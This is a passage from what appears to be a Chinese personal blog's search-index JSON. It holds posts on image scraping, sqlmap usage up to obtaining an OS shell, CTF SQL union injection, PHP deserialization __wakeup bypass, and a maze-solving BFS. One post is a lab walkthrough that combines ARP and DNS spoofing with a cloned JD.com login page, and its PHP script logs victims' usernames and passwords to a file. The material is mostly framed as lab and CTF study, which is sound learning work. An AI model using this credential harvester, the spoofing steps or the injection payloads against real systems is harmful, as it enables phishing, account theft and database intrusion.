src=\"//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg\" data-lazy-img=\"done\" source-data-lazy-img=\"\"&gt;urls = re.findall(findlinks, html)for url in urls: time.sleep(1) file_name = url.split('/')[-1] res = requests.get(\"http:\"+url,headers = head) with open(dir+'/'+file_name, \"wb\") as f: f.write(res.content)","tags":[{"name":"python","slug":"python","permalink":"https://sunzhengyu99.github.io/tags/python/"}]},{"title":"sqlmap","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/sql注入/","text":"sqlmap使用 第一步: -u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测第二步: -u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取第三步: -u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举第四步: -u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举第五步: -u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump //探测user表name和password字段如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字典进行爆破。 第六步: -u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言sql注入order by * group by * 利用内置函数暴数据库信息 version() 查看数据库版本 database() 查看当前数据库名 user() 查看当前用户 查看表： Select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() 可十六进制查看字段： select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"爬图","date":"2020-07-18T09:40:51.000Z","path":"2020/07/18/爬图/","text":"用爬虫爬取小姐姐的图片 用的库 1234re #正则表达式requests #url请求time #时间os #用于创建文件夹，保存图片 ##准备工作1.首先访问该链接https://www.vmgirls.com/2.随便点击一个进入查看详情https://www.vmgirls.com/13344.html3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式该正则表达式为findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39; 完整程序12345678910111213141516171819202122232425262728293031# -*- coding = utf - 8 -*-#@Time : 2020/7/16 13:36#@Author : sunzy#@File : tupian.pyimport reimport requestsimport timeimport osdir = \"plmm\" #文件夹名字if not os.path.exists(dir): #首先判断是否存在当前文件夹如果没有则创建一个 os.mkdir(dir)# 模仿浏览器的首部信息，绕过一些网站的反爬取措施head = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61\" &#125;url = \"https://www.vmgirls.com/13344.html\"response = requests.get(url, headers = head) # 访问目标网页，获取网页内容html = response.textfindlinks = '&lt;a href=\"(.*?)\" alt=\".*?\" title=\".*?\"&gt;'urls = re.findall(findlinks, html) #爬取到的图片链接保存在urls中， 是一个列表for url in urls: time.sleep(1) #防止访问速度过快使服务器崩溃 file_name = url.split('/')[-1] #保存图片的名字 res = requests.get(url, headers = head) #依此访问图片链接 with open(dir+'/'+file_name, \"wb\") as f: #以二进制形式保存图片 f.write(res.content)","tags":[{"name":"爬虫","slug":"爬虫","permalink":"https://sunzhengyu99.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"diaoyu","date":"2020-07-18T09:37:15.000Z","path":"2020/07/18/diaoyu/","text":"DNS欺骗、ARP攻击及钓鱼网站制作 1.实验目的获取登录jd网页的用户名和密码2.实验主机一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者3.实验材料京东登录网页及其所有图片（浏览器访问https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F 之后保存网页即可）修改index.html中的内容error.php中的内容如下关键代码（用于保存用户名和密码以及迷惑用户） 12345678910111213141516171819&lt;?php$nam = stripslashes($_POST['name']); //name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要$pas = stripslashes($_POST['pass']);//pass也一样$content = \"您已捕获京东账号及密码1个：\" . \" 用户名 \" . $nam . \" 密码 \" . $pas; //保存捕获的用户名和密码$filed = @fopen(\"1.txt\", \"a+\"); //打开1.txt@fwrite($filed, \"$content\\n\"); //将用户名和密码写入1.txt?&gt;&lt;html&gt;&lt;head&gt;&lt;script type=\"text/javascript\"&gt; function goBack() &#123; window.history.back() //后退+刷新 &#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=\"goBack()\"&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;&lt;/body&gt;&lt;/html&gt; 4.实验拓扑图 实验步骤一.部署京东的服务器1.安装DNS和web服务器（具体步骤略）2.配置DNS服务器a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）b.在jd域中新建一台主机 www.jd.com ip:10.1.1.1 2.IISa.将默认网站停止b.新建网站jd.com,文件路径为保存的jd网页c.打开web服务中的asp（因为此网站不是静态网站）（使用2003客户机访问www.jd.com看看网站发布是否成功） 二.部署kali1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。2.开启apache服务，并检查80端口是否已开启systemctl start apache2netstat -antpl3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，添加一条 PTR 记录，使用户访问任何网页，全部指向为10.1.1.2 选中一行后，按两次d可删除内容想要编辑时，先按i(insert)编辑结束后 :wq 保存4.打开ettercap软件5.选择sniff–unified sniffing，并选择监听eth06.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机7.添加欺骗记录选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 28.在Mitm选择ARP欺骗在弹出的窗口中，勾选第一个点击确定9.选择plugins – Manage the plugins，准备进行DNS欺骗在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗 三.用户访问登录页面1.在客户机中在中，再次登录www.jd.com输入用户名密码等，如图，然后点击登录2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)","tags":[{"name":"DNS","slug":"DNS","permalink":"https://sunzhengyu99.github.io/tags/DNS/"}]},{"title":"guestbook","date":"2020-04-18T09:42:34.000Z","path":"2020/04/18/Guestbook/","text":"guestbook 题目提示：This guestbook sucks. sqlmap is your friend. 是sql注入点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息 在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点union 注入!查看列 12https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,3,4%20#//id=-1 是让前面的内容不显示 3被回显 1.查看数据库名 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,database(),4%20# 数据库的名字g8 2.查看表名 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4# 发现有一个表 flag 3.测试表的字段 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select column_name from information_schema.columns where table_name='flag' limit 1,1),4# 仍然显示flag 4.读取flag 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4# 得到flag!","tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://sunzhengyu99.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"反序列化","date":"2020-03-28T09:42:34.000Z","path":"2020/03/28/php反序列化/","text":"反序列化 PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 而wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。 serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。 unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。 举例说明 &lt;?php class Student{ public $full_name = &apos;zhangsan&apos;; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; } } $s = new Student(); var_dump(serialize($s)); ?&gt; O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}各个符号的含义变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容} 其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。 当我们将上述的序列化的字符串中的对象属性个数修改为5，变为O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}} 最后执行运行的代码如下: &lt;?php class Student{ public $full_name = &apos;zhangsan&apos;; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; } function __destruct() { var_dump($this); } } $s = new Student(); $stu = unserialize(&apos;O:7:&quot;Student&quot;:5:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}&apos;); ?&gt;举例说明题目 class xctf{ public $flag = &apos;111&apos;; public function __wakeup(){ exit(&apos;bad requests&apos;); } ?code= &lt;?php class xctf{ //定义一个名为xctf的类 public $flag = &apos;111&apos;;//定义一个公有的类属性$flag，值为111 public function __wakeup(){ //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本 exit(&apos;bad requests&apos;); } } $test = new xctf(); //使用new运算符来实例化该类（xctf）的对象为test echo(serialize($test)); //输出被序列化的对象（test） ?&gt;输出结果 O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示： O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}","tags":[{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"}]},{"title":"木马","date":"2020-03-20T10:07:12.000Z","path":"2020/03/20/迷宫问题/","text":"原题题目描述 小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。 小明只能向上下左右四个方向移动。 输入 输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。 每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。 接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。 字符的含义如下：‘S’：起点‘E’：终点‘-’：空地，可以通过‘#’：障碍，无法通过 输入数据保证有且仅有一个起点和终点。 输出 对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。 样例输入1 5 5 s-### ----- ##--- E#--- ---##样例输出9解决代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include&lt;iostream&gt;#include&lt;cstring&gt;#include&lt;string&gt;#include&lt;queue&gt;#include &lt;algorithm&gt;using namespace std;int de[100][100];//计步数组 记录走到这个位置所需的步数 不能走到的位置标记为-1 char map[100][100]; //用于存放迷宫地图 typedef pair&lt;int,intP; //坐标int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //在当前坐标下能走的四个方向int sx,ex,sy,ey; //(sx,sy)为起点坐标 （ex,ey）为终点坐标int x,y,nx,ny; //(x,y)为函数中当前位置坐标 （nx,ny)为接下来能到达的坐标 int r,l; //r为行数 l为列数 int bfs()&#123; memset(de,-1,sizeof(de)); queue&lt;Pqu; qu.push(P(sx,sy)); //将起点坐标放入队头 de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //取出队头坐标 qu.pop() ;//删除对头及走过的坐标 x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //到达终点 跳出循环 for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//开始向四个方向移动 ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!='#'&amp;&amp;de[nx][ny]==-1) //判断是否越界 以及是否能走 排除走过的路 &#123; qu.push(P(nx,ny)); //将能走的坐标放入队列 之后依次删除 de[nx][ny]=de[x][y]+1; //步数加一 &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //终点的记步数组为-1 及不能到达终点 else return de[ex][ey]; &#125; int main()&#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]=='S') //记录起点坐标 &#123; sx=i,sy=j; &#125; else if(map[i][j]=='E') //记录终点坐标 &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0;&#125;","tags":[{"name":"bfs","slug":"bfs","permalink":"https://sunzhengyu99.github.io/tags/bfs/"}]}]